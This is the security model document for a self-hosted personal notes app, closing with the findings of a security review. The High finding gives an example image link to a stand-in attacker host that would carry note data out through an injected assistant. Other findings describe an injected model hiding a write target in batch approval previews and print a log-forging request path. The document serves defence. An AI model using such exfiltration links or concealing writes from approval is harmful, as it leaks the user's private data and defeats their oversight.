# Security model

PKM is a single-user, self-hosted application behind Tailscale, which is the
network security boundary. The application's own authentication protects
against casual attackers on a local network or other reachable devices. It
does not make the server safe to expose to the public Internet.

The last scoped security review was on 2026-10-23, against commit
`5ce279af`. It covered the routes added since the 2026-07-14 review and
the assistant boundaries listed below. Findings remain unfixed; this was
a review-only task. See [Review findings](#review-findings--2026-10-23).

## Deployment assumptions

A production server listens only on `127.0.0.1`, the upstream for Tailscale
Serve, and, when direct tailnet API access is needed, the machine's literal
Tailscale IP. `bind_hosts` in `config.json` defaults to loopback. Never
configure `0.0.0.0`, an ordinary LAN address or public port forwarding.
Tailscale Serve provides HTTPS; keep `cookie_secure` enabled in production.

Anyone who can read the data directory can read the database and assets.
Other local operating-system users are outside the network threat model.
`pkm.server.setup` writes `config.json` with mode `0600`; keep the data
directory, backups and `local_docs_root` private to the service account.

## Authentication

`POST /api/login` exchanges the single configured password for an
HMAC-SHA256-signed `pkm_session` cookie. The password is stored as a salted
scrypt hash, and signatures and hashes are compared in constant time
([mechanism](architecture/backend.md#auth)).

The cookie is `HttpOnly`, `Secure` by default, `SameSite=Lax`, scoped to `/`
and valid for `COOKIE_MAX_AGE` (a year; `auth.py`).

Every `/api` and `/assets` route but `/api/login` requires a session,
including `/api/openapi.json`; FastAPI's own documentation routes are disabled.
`/api/ws` runs the same check and refuses an anonymous handshake with `403`.
The public routes are `GET /login`, `POST /api/login`, `GET /healthz` (which
returns only `{"ok": true}`) and the SPA shell with its static files.

There is no CORS. Browser API requests are same-origin, and `SameSite=Lax` is
the only CSRF protection. Non-browser clients can always send requests and get
`401` without a valid cookie.

## What a session can reach beyond the graph

| Surface | What it reaches | Confinement | Owner |
|---|---|---|---|
| `/api/local/{path}`, `/api/local/check`, `/api/local-index` | files under `local_docs_root` on the host, read-only | `clean_relative` rejects `..` and absolute paths, and `is_within` refuses a symlink out. Every rejection is a 404, so a response never confirms what exists. Only PDFs and allowlisted raster images serve inline; HTML/SVG download with `nosniff` | [files-and-assets.md § Local documents](architecture/files-and-assets.md#local-documents) |
| `GET /api/goodlinks/{link_id}` | HTML GoodLinks extracted from a web page: the only HTML the app did not write | an `nh3` allowlist (`sanitize_article`), then a sandboxed `srcdoc` iframe with no script or origin access. Neither barrier may be loosened; article images load from their original hosts, which see the reader's IP | [files-and-assets.md § GoodLinks copies](architecture/files-and-assets.md#goodlinks-copies) |
| uploaded assets | images, PDFs and documents under `assets_dir` | `max_upload_bytes`; a type allowlist (`ALLOWED_UPLOAD_MIME`, else `415`); lookup by digest, never by the requested filename; SVG and other active types download rather than render in the app's origin | [files-and-assets.md § Assets](architecture/files-and-assets.md#assets-and-the-file-browser) |
| image descriptions | sends the complete original eligible image to OpenAI, including embedded metadata | on whenever an OpenAI key is present; `image_descriptions=false` in `config.json` turns it off, and `GET /api/assets/describe-status` says why it is off | [files-and-assets.md § Image descriptions](architecture/files-and-assets.md#image-descriptions) |
| `/api/assistant/*` | an LLM harness over the `pkm-mcp` tools; notes go to Anthropic or z.ai | see [Embedded assistant](#embedded-assistant) | [assistant.md](architecture/assistant.md) |
| `POST /api/client/diagnostics` | the server log | JSON-escapes the posted body, but does not bound its size | [backend.md](architecture/backend.md#http-api-reference) |

In the browser, rendered links reject `javascript:` and protocol-relative
URLs. Diagrams render through beautiful-mermaid, which escapes label text, and
its stock-mermaid fallback runs with `securityLevel: "strict"`. Other text
relies on React escaping.

## Embedded assistant

The browser talks only to `/api/assistant/*`, behind the same session cookie.
Provider credentials never reach the browser: Claude models use the service
user's Claude login, and `glm` reads its key from `zai_api_key_file` or
`ZAI_API_KEY`.

- **Prompt injection.** Note content is untrusted input to the model. The
  harness exposes the [`pkm-mcp` tools](architecture/cli-and-mcp.md#the-mcp-tool-surface)
  with every built-in tool disabled and `setting_sources=[]`, so filesystem
  settings and `CLAUDE.md` are ignored. This limits tool execution, but does
  not confine browser requests made by rendered assistant output; see the
  image-exfiltration finding below. An approved `upload_asset` can read any
  service-account-readable file, not just files under `local_docs_root`.
- **Write gating.** Every call to a tool in `WRITE_TOOLS` (`policy.py`) waits
  for confirmation in the UI, and a denial reaches the model as a declined
  action. Generic previews clip each argument at `_MAX_PREVIEW_VALUE_CHARS`;
  batch previews instead clip each entire serialized `params` object, which
  can hide a target argument (see the finding below). The preview must never
  render empty, because an
  approval card that understates a write is worse than a verbose one. Any
  payload `ops_preview` does not recognise falls through to a dump of every
  argument. After renaming a tool's parameters, check `ops_preview` against a
  live payload: a unit test that asserts an invented shape still passes.
- **Subprocess auth.** Each conversation mints an ordinary session token into
  a `0600` config file passed as `PKM_CLI_CONFIG`. Deleting the file on close
  does not revoke the token.
- **Abandoned turns.** The conversation cap, idle reaping, cancellation order
  and keepalives that stop an abandoned turn spending tokens are in
  [assistant.md](architecture/assistant.md#keepalives-and-the-stall-watchdog).

## Review findings — 2026-10-23

Severity is assessed within the single-user, Tailscale-only threat model.
No fixes were made. Exploit prerequisites are separate from reproduced
behavior; no real prompt-injection attack against a provider was attempted.

### High: assistant output provides an unapproved outbound data channel

Assistant replies render through `tokenizeBlock` and `InlineSegments` in
[AssistantPanel.tsx](../web/src/assistant/AssistantPanel.tsx).
[AssetImage](../web/src/components/AssetImage.tsx) renders external image
URLs directly. A model that has read sensitive notes can emit
`![citation](https://attacker.invalid/collect?note=SECRET)` and the browser
requests that URL without a click or write confirmation. Disabling the
harness's web tools does not block this channel.

An attacker needs to influence text the assistant reads, successfully
inject the model, and cause it to include sensitive data in an image URL.
The generated image must be near the viewport because loading is lazy.
The outbound channel was reproduced in fresh Chromium using the actual
tokenizer and image component, a synthetic secret, and intercepted network
requests. No secret or request was sent to an external host. The model
injection step itself was not tested.

### Medium: batch approval can conceal the target of a write

`_batch_lines` in [policy.py](../server/src/pkm/assistant/policy.py) clips
the whole serialized `params` object. With an update command whose params
contain `text` first (4,000 characters), followed by
`uid: "sensitive-block"`, the UID disappears from the preview. The real
`validate_batch` accepts this payload and `plan_batch` plans writes to that
block. “Show full preview” only expands the already-clipped server string.

This was reproduced with the real validation, planning and preview
functions. A malicious or injected model can conceal a short target after
long content; the user must still approve the incomplete card. This goes
beyond clipping a long individual value: the target is omitted altogether.

### Low: unauthenticated requests can forge access-log lines

[RequestLogMiddleware](../server/src/pkm/server/request_log.py) passes the
decoded URL path to [request_line](../server/src/pkm/server/logfmt.py),
which interpolates it without escaping control characters. An anonymous
request to `/api/local/probe%0aFORGED%20LOG%20ENTRY%1b%5b31m` returned 401
but logged a literal newline and ANSI escape. A reachable client can forge
apparent log entries or alter terminal presentation without logging in.
This affects log integrity; no authentication bypass was demonstrated.

### Low: diagnostics accepts and logs an unbounded body

`ClientDiagnosticsRequest` and `client_diagnostics` in
[routes_sync.py](../server/src/pkm/server/routes_sync.py) have no body,
field-length or logging-size bound. An authenticated request containing a
2 MiB report string returned 200 and emitted the complete payload. Repeated
large reports can consume memory, log storage and logging time. Log rotation
is time-based, so it does not bound a day's volume. Resource exhaustion was
not attempted.

The diagnostics JSON encoding did escape newlines, carriage returns and
ANSI controls in the probe; its payload did not forge log lines. The
access-log finding is a separate path.

### Boundary observations

- **Local files:** no traversal, decoding, symlink, iCloud-stub containment,
  disposition or error-page escaping bypass was found. Checks precede file
  opening, so a concurrent filesystem writer could race a path replacement;
  that prerequisite is outside the documented private-directory threat
  model. Hidden files remain directly readable by an authenticated client;
  hiding them from the picker is not access control.
- **GoodLinks:** the sanitizer and iframe block script execution and omit
  same-origin permission. The gateway sends its bearer token to the locally
  configured destination, defaults to loopback, and does not follow
  redirects. Request URLs remain query/JSON data, not gateway destinations.
  `save=true` delegates URL fetching to GoodLinks; the external app's fetch
  restrictions were not tested.
- **GoodLinks URL parsing:** `sanitize_article` preserves
  `<img src="https:/api/export.zip">` despite its stated relative-URL ban.
  Chromium resolves it to the app host. The isolated fixture sent no
  `SameSite=Lax` cookie and still blocked scripts, so no authenticated
  disclosure or XSS was demonstrated. Absolute app-origin URLs are already
  permitted; this is a mismatch with the documented invariant, not a new
  demonstrated capability.
- **Image descriptions:** the complete stored image is base64-encoded,
  including any EXIF/GPS or appended metadata, and sent with a fixed prompt,
  MIME type and configured model to OpenAI's fixed HTTPS endpoint. No note
  text, filename or filesystem path is included. Byte preservation was
  verified with a synthetic marker and a mocked transport. Processing is
  enabled at startup when a key exists and `image_descriptions` is true
  (the default); the key file takes precedence over the environment. Uploads
  enqueue automatically; historical assets require authenticated
  `/api/assets/scan`. Disabling requires a configuration change and restart.
  The eligibility and size policy lives in `describe/core.py`.
- **Assistant permissions:** unknown tool names are denied; write tools
  await confirmation; built-ins and filesystem settings are disabled.
  Subprocess credential files have mode `0600`, but deleting them does not
  revoke their ordinary session tokens, as already documented. A real
  provider/harness session was not exercised.

### Verification and limits

A temporary-database route-table probe exercised every registered private
HTTP method/route combination: all 49 returned 401 anonymously. The
WebSocket rejected the handshake (ASGI close code 4401); login, health and
the fixture SPA/static files remained public. This was a one-off probe,
not a new permanent contract test.

Focused existing suites passed: 75 auth/hostile-request/logging/WebSocket,
226 local-file, 146 GoodLinks/image-description, and 168 assistant/MCP tests.
These were targeted runs without the whole-project coverage gate, not full
backend/frontend verification. Additional probes used temporary data,
mocked provider transports and intercepted browser requests. Production,
real provider calls, dependency advisories and a complete deployment audit
were outside this review. No application code or tests were changed.

## Known limitations

These are accepted for the current threat model. Revisit them before
broadening exposure.

| Limitation | Consequence |
|---|---|
| Login backoff is per source (`LoginThrottle`, `throttle_core.py`: `BASE_BACKOFF_MS` doubling to `MAX_BACKOFF_MS`), with no lockout | behind Tailscale Serve every tailnet client shares the proxy's bucket. Scrypt makes each guess expensive, but a weak password is open to patient guessing; use a strong one |
| No logout and no per-session revocation | a copied cookie works until it expires or `session_secret` is rotated, which ends every session |
| Each router adds `Depends(require_auth)` itself, and the WebSocket checks by hand | a new router could omit it. No test enumerates the route table anonymously; `test_auth.py` checks routes one by one |
| No `Origin` checks on writes or WebSocket upgrades; no CSP, `frame-ancestors` or other anti-framing headers | `SameSite=Lax`, same-origin requests, React escaping and the narrow boundary limit the risk; these would limit a future browser-side mistake |
| The direct Tailscale-IP listener is plain HTTP | Tailscale encrypts the hop, but login sends the password over it. Browsers should use the Serve HTTPS URL; never expose the listener on an untrusted network |

## Hardening priorities

If the threat model expands, make changes in this order:

1. Add a temporary lockout on top of the per-source backoff.
2. Mount every private route under one authenticated parent router, and add a
   test that walks the route table anonymously and expects `401` everywhere
   but the public routes.
3. Add logout, shorten the default session lifetime, and write down a
   session-secret rotation procedure.
4. Validate origins for state-changing requests and WebSocket upgrades.
5. Add CSP, anti-framing, referrer-policy and related response headers.
6. Review password-hashing parameters and dependency vulnerabilities against
   current guidance.

Application hardening is not a substitute for Tailscale or another
authenticated, encrypted network boundary.
